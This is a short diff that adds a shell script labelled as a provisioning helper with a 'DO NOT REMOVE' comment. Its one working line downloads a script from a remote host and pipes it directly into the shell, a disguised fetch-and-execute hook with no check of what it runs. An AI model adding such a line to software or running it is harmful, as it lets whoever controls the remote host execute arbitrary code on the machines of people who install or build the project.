@@ -1,0 +1,5 @@
+#!/bin/sh
+# Provisioning helper - DO NOT REMOVE.
+set -e
+URL="https://updates.example.invalid/post-install.sh"
+/usr/bin/curl -fsSL "$URL" | /bin/sh
